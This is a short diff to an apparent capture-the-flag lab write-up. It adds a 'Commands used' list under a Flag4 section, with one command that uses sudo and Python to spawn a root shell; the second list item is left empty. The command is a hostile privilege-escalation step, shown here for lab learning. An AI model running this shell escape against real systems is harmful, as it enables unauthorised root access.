@@ -78,3 +78,6 @@ Flag4.txt:
 
 ![Activity 1 Day 2 part 7 1](https://user-images.githubusercontent.com/88813019/157805372-dfeeeb22-d81e-4091-b72d-4470cf44e2ae.PNG)
 
+Commands used:
+- sudo python -c 'import os; os.system("/bin/sh")'
+- 
